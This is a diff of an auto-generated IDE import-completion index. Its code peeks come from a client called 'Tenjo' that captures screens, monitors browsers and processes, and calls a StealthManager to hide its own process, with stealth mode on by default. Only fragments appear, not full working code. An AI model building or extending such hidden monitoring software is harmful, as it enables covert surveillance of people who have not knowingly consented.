@@ -247,6 +247,15 @@
         "documentation": {}
     },
     {
+        "label": "signal",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "signal",
+        "description": "signal",
+        "detail": "signal",
+        "documentation": {}
+    },
+    {
         "label": "Config",
         "importPath": "src.core.config",
         "description": "src.core.config",
@@ -345,15 +354,6 @@
         "documentation": {}
     },
     {
-        "label": "signal",
-        "kind": 6,
-        "isExtraImport": true,
-        "importPath": "signal",
-        "description": "signal",
-        "detail": "signal",
-        "documentation": {}
-    },
-    {
         "label": "lexers",
         "importPath": "sphinx.highlighting",
         "description": "sphinx.highlighting",
@@ -384,6 +384,15 @@
         "importPath": "client.src.modules.browser_monitor",
         "description": "client.src.modules.browser_monitor",
         "peekOfCode": "class BrowserMonitor:\n    def __init__(self, api_client):\n        self.api_client = api_client\n        self.is_running = False\n        self.browser_processes = {}\n        self.active_tabs = {}\n        self.check_interval = 5  # seconds\n        # Browser process names\n        self.browser_names = [\n            'chrome.exe', 'firefox.exe', 'msedge.exe', 'opera.exe', 'safari.exe',",
+        "detail": "client.src.modules.browser_monitor",
+        "documentation": {}
+    },
+    {
+        "label": "_modules_warning_shown",
+        "kind": 5,
+        "importPath": "client.src.modules.browser_monitor",
+        "description": "client.src.modules.browser_monitor",
+        "peekOfCode": "_modules_warning_shown = False\nif platform.system() == 'Windows':\n    try:\n        import pygetwindow as gw\n        import win32gui\n        import win32process\n        WINDOWS_AVAILABLE = True\n    except ImportError:\n        WINDOWS_AVAILABLE = False\n        gw = None",
         "detail": "client.src.modules.browser_monitor",
         "documentation": {}
     },
@@ -419,7 +428,7 @@
         "kind": 6,
         "importPath": "client.src.utils.api_client",
         "description": "client.src.utils.api_client",
-        "peekOfCode": "class APIClient:\n    def __init__(self, server_url, api_key):\n        self.server_url = server_url.rstrip('/')\n        self.api_key = api_key\n        self.client_id = None\n        self.session = requests.Session()\n        # Set default headers\n        self.session.headers.update({\n            'Authorization': f'Bearer {api_key}',\n            'Content-Type': 'application/json',",
+        "peekOfCode": "class APIClient:\n    def __init__(self, server_url, api_key):\n        self.server_url = server_url.rstrip('/')\n        self.api_key = api_key\n        self.client_id = None\n        self.session = requests.Session()\n        # Cache for missing endpoints to avoid spam warnings\n        self._missing_endpoints = set()\n        # Set default headers\n        self.session.headers.update({",
         "detail": "client.src.utils.api_client",
         "documentation": {}
     },
@@ -442,38 +451,20 @@
         "documentation": {}
     },
     {
-        "label": "test_simple_request",
-        "kind": 2,
-        "importPath": "client.debug_api",
-        "description": "client.debug_api",
-        "peekOfCode": "def test_simple_request():\n    \"\"\"Test simple request without any headers\"\"\"\n    try:\n        response = requests.get('http://localhost:8003/api/health', timeout=10)\n        print(f\"✅ Simple request: {response.status_code} - {response.text}\")\n        return True\n    except Exception as e:\n        print(f\"❌ Simple request failed: {e}\")\n        return False\ndef test_with_headers():",
-        "detail": "client.debug_api",
-        "documentation": {}
-    },
-    {
-        "label": "test_with_headers",
-        "kind": 2,
-        "importPath": "client.debug_api",
-        "description": "client.debug_api",
-        "peekOfCode": "def test_with_headers():\n    \"\"\"Test with API client headers\"\"\"\n    try:\n        headers = {\n            'Authorization': 'Bearer dummy-key',\n            'Content-Type': 'application/json',\n            'User-Agent': 'Tenjo-Client/1.0'\n        }\n        response = requests.get('http://localhost:8003/api/health', headers=headers, timeout=10)\n        print(f\"✅ With headers: {response.status_code} - {response.text}\")",
-        "detail": "client.debug_api",
-        "documentation": {}
-    },
-    {
-        "label": "test_api_client",
-        "kind": 2,
-        "importPath": "client.debug_api",
-        "description": "client.debug_api",
-        "peekOfCode": "def test_api_client():\n    \"\"\"Test actual API client\"\"\"\n    try:\n        sys.path.append('/Users/yapi/Adi/App-Dev/Tenjo/client')\n        from src.utils.api_client import APIClient\n        from src.core.config import Config\n        client = APIClient(Config.SERVER_URL, 'dummy-key')\n        result = client.get('/api/health')\n        print(f\"✅ API Client: {result}\")\n        return True",
-        "detail": "client.debug_api",
-        "documentation": {}
-    },
-    {
         "label": "TenjoClient",
         "kind": 6,
         "importPath": "client.main",
         "description": "client.main",
-        "peekOfCode": "class TenjoClient:\n    def __init__(self):\n        # Use API_ENDPOINT from config\n        self.api_client = APIClient(Config.SERVER_URL, Config.CLIENT_ID)\n        self.stealth_manager = StealthManager()\n        # Initialize modules\n        self.screen_capture = ScreenCapture(self.api_client)\n        self.browser_monitor = BrowserMonitor(self.api_client)\n        self.process_monitor = ProcessMonitor(self.api_client)\n        self.stream_handler = StreamHandler(self.api_client)",
+        "peekOfCode": "class TenjoClient:\n    def __init__(self, stealth_mode=True):\n        # Use API_ENDPOINT from config\n        self.api_client = APIClient(Config.SERVER_URL, Config.CLIENT_ID)\n        self.stealth_manager = StealthManager()\n        self.stealth_mode = stealth_mode\n        # Set up stealth logging if in stealth mode\n        if stealth_mode:\n            self._setup_stealth_logging()\n        # Initialize modules",
+        "detail": "client.main",
+        "documentation": {}
+    },
+    {
+        "label": "signal_handler",
+        "kind": 2,
+        "importPath": "client.main",
+        "description": "client.main",
+        "peekOfCode": "def signal_handler(signum, frame):\n    \"\"\"Handle shutdown signals gracefully\"\"\"\n    global shutdown_flag\n    logging.info(f\"Received signal {signum}, initiating graceful shutdown...\")\n    shutdown_flag = True\nclass TenjoClient:\n    def __init__(self, stealth_mode=True):\n        # Use API_ENDPOINT from config\n        self.api_client = APIClient(Config.SERVER_URL, Config.CLIENT_ID)\n        self.stealth_manager = StealthManager()",
         "detail": "client.main",
         "documentation": {}
     },
@@ -482,7 +473,16 @@
         "kind": 2,
         "importPath": "client.main",
         "description": "client.main",
-        "peekOfCode": "def main():\n    \"\"\"Main entry point\"\"\"\n    try:\n        client = TenjoClient()\n        # Hide process\n        client.stealth_manager.hide_process()\n        # Start monitoring\n        client.start_monitoring()\n    except KeyboardInterrupt:\n        logging.info(\"Client stopped by user\")",
+        "peekOfCode": "def main(stealth_mode=True):\n    \"\"\"Main entry point\"\"\"\n    global shutdown_flag\n    # Register signal handlers for graceful shutdown\n    signal.signal(signal.SIGTERM, signal_handler)\n    signal.signal(signal.SIGINT, signal_handler)\n    client = None\n    try:\n        # Check if running from stealth installation\n        is_stealth = stealth_mode or 'stealth_main.py' in sys.argv[0] or len(sys.argv) > 1 and sys.argv[1] == '--stealth'",
+        "detail": "client.main",
+        "documentation": {}
+    },
+    {
+        "label": "shutdown_flag",
+        "kind": 5,
+        "importPath": "client.main",
+        "description": "client.main",
+        "peekOfCode": "shutdown_flag = False\ndef signal_handler(signum, frame):\n    \"\"\"Handle shutdown signals gracefully\"\"\"\n    global shutdown_flag\n    logging.info(f\"Received signal {signum}, initiating graceful shutdown...\")\n    shutdown_flag = True\nclass TenjoClient:\n    def __init__(self, stealth_mode=True):\n        # Use API_ENDPOINT from config\n        self.api_client = APIClient(Config.SERVER_URL, Config.CLIENT_ID)",
         "detail": "client.main",
         "documentation": {}
     },
